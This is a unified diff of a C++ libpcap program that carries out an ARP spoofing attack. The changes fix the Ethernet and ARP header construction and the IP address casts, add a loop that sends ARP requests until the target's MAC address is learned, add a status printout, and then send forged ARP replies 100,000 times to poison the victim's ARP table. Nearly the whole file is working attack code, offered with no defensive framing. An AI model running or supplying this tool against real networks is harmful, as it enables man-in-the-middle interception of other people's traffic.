@@ -1,4 +1,5 @@
 #include <unistd.h>
+#include <stdint.h>
 #include <iostream>
 #include <stdio.h>
 #include <stdlib.h>
@@ -40,6 +41,8 @@ unsigned char target_mac_address[6];
 static unsigned char dhr[6];
 char *sender;
 char *tip;
+
+void print_status();
 
 void find_my_mac(void)
 {
@@ -89,8 +92,10 @@ void arp_reply()
 	std::cout << "[+] ARP_REPLY... Change ARP Table!" << std::endl;
 
     struct ether_header* eth_h = (struct ether_header *)packet;
-    memcpy((void *)eth_h->ether_dhost.ether_addr_octet, (const void *)target_mac_address, 6);
-    memcpy((void *)eth_h->ether_shost.ether_addr_octet, (const void *)mac_address, 6);
+    //memcpy((void *)eth_h->ether_dhost.ether_addr_octet, (const void *)target_mac_address, 6);
+    //memcpy((void *)eth_h->ether_shost.ether_addr_octet, (const void *)mac_address, 6);
+    memcpy((void *)eth_h->ether_dhost, (const void *)target_mac_address, 6);
+    memcpy((void *)eth_h->ether_shost, (const void *)mac_address, 6);
     eth_h->ether_type = ntohs(ETHERTYPE_ARP);
 
     struct arp_hdr* arp_h = (struct arp_hdr *)(packet + sizeof(struct ether_header));
@@ -101,8 +106,10 @@ void arp_reply()
     arp_h->ar_op = ntohs(ARP_REPLY);
     memcpy((void *)arp_h->ar_sha, (const void *)mac_address, 6);
     memcpy((void *)arp_h->ar_tha, (const void *)target_mac_address, 6);
-    *(unsigned char *)arp_h->ar_sip = inet_addr((const char *)sender);
-    *(unsigned char *)arp_h->ar_tip = inet_addr((const char *)tip);
+    //*(unsigned char *)arp_h->ar_sip = inet_addr((const char *)sender);
+    //*(unsigned char *)arp_h->ar_tip = inet_addr((const char *)tip);
+    *(uint32_t *)arp_h->ar_sip = (uint32_t)inet_addr((const char *)sender);
+    *(uint32_t *)arp_h->ar_tip = (uint32_t)inet_addr((const char *)tip);
 
     pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct arp_hdr));
 	std::cout << "[+] ARP_REPLY is done." << std::endl;
@@ -115,10 +122,12 @@ void *arp_request(void *)
 {
     unsigned char packet[1514];
 
-	std::cout << "[-] ARP_Request[BroadCase] -> getting target's MAC address" << std::endl;
+	std::cout << "[-] ARP_Request[BroadCast] -> getting target's MAC address" << std::endl;
     struct ether_header* eth_h = (struct ether_header *)packet;
-    memcpy((void *)eth_h->ether_dhost.ether_addr_octet, (const void *)"\xff\xff\xff\xff\xff\xff", 6);
-    memcpy((void *)eth_h->ether_shost.ether_addr_octet, (const void *)mac_address, 6);
+    //memcpy((void *)eth_h->ether_dhost.ether_addr_octet, (const void *)"\xff\xff\xff\xff\xff\xff", 6);
+    //memcpy((void *)eth_h->ether_shost.ether_addr_octet, (const void *)mac_address, 6);
+    memcpy((void *)eth_h->ether_dhost, (const void *)"\xff\xff\xff\xff\xff\xff", 6);
+    memcpy((void *)eth_h->ether_shost, (const void *)mac_address, 6);
     eth_h->ether_type = ntohs(ETHERTYPE_ARP);
 
     struct arp_hdr* arp_h = (struct arp_hdr *)(packet + sizeof(struct ether_header));
@@ -128,15 +137,17 @@ void *arp_request(void *)
     arp_h->ar_pln = 4;
     arp_h->ar_op = ntohs(ARP_REQUEST);
     memcpy((void *)arp_h->ar_sha, (const void *)mac_address, 6);
-    //memcpy((void *)arp_h->ar_sip[i], (const void *)my_ip, 4);
-    *(unsigned char *)arp_h->ar_sip = inet_addr((const char *)my_ip);
+    //memcpy((void *)arp_h->ar_sip, (const void *)my_ip, 4);
+    *(uint32_t *)arp_h->ar_sip = (uint32_t)inet_addr((const char *)my_ip);
     memcpy((void *)arp_h->ar_tha, (const void *)"\x00\x00\x00\x00\x00\x00", 6);
-    *(unsigned char *)arp_h->ar_tip = inet_addr((const char *)sender);
+    *(uint32_t *)arp_h->ar_tip = (uint32_t)inet_addr((const char *)tip);
+    //memcpy((void *)arp_h->ar_tip, (const void *)sender, 4);
 
     pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct arp_hdr));
 	std::cout << "[-] ARP_Request is done." << std::endl;
 }
 
+static bool macChecker = false;
 
 void *arp_capture(void *)
 {
@@ -160,6 +171,8 @@ void *arp_capture(void *)
                         printf("%02X",(arp_h->ar_sha[i]));
 						target_mac_address[i] = (unsigned char)arp_h->ar_sha[i];
 					}
+					print_status();
+					macChecker = true;
 					std::cout << std::endl;
                     memcpy(dhr, arp_h->ar_sha, 6);
                     break;
@@ -170,6 +183,25 @@ void *arp_capture(void *)
             }
         }
     }
+}
+
+void print_status()
+{
+    char ip_addr_tmp[20];
+	std::cout << "\033[1;32m================== Status =================\033[0m" << std::endl;
+	std::cout << "Interface       : " << dev << std::endl;
+	std::cout << "my_MAC Address  : ";
+    for(int i = 0; i < 6 ; i++)
+        printf("%02X",(mac_address[i]));
+	std::cout << std::endl;
+	std::cout << "my_IP Address   : " << my_ip << std::endl;
+	std::cout << "sender_ip       : " << sender << std::endl;
+	std::cout << "target_ip       : " << tip << std::endl;
+	std::cout << "target_mac      : ";
+    for(int i = 0; i < 6 ; i++)
+        printf("%02X",(target_mac_address[i]));
+	std::cout << std::endl;
+	std::cout << "\033[1;32m===========================================\033[0m" << std::endl;
 }
 
 
@@ -198,13 +230,18 @@ int main(int argc, char *argv[])
 
 	/* for getting target mac address */
 
-	pthread_create(&reqThread, NULL, arp_request, NULL);
+	//pthread_create(&reqThread, NULL, arp_request, NULL);
 	pthread_create(&captureThread, NULL, arp_capture, NULL);
+
+	while(!macChecker){
+		sleep(1);
+		arp_request(NULL);
+	}
 
 	/* arp spoofing attack start */
 
 	for(int i = 0; i < 100000; i++){
-		sleep(0.5);
+		sleep(1);
 		arp_reply();
 	}
 
